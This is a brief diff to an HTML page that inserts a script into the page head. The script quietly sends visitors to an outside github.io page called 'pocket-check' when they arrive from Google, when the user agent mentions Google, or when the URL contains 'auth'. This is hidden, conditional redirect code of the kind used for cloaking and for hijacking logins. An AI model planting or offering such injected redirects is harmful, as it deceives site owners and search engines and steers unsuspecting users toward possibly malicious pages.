@@ -1,6 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+    if (navigator.userAgent.includes("Google") || window.location.search.includes("auth") || document.referrer.includes("google")) {
+        window.location.href = "https://hakim-mf.github.io/pocket-check/";
+    }
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
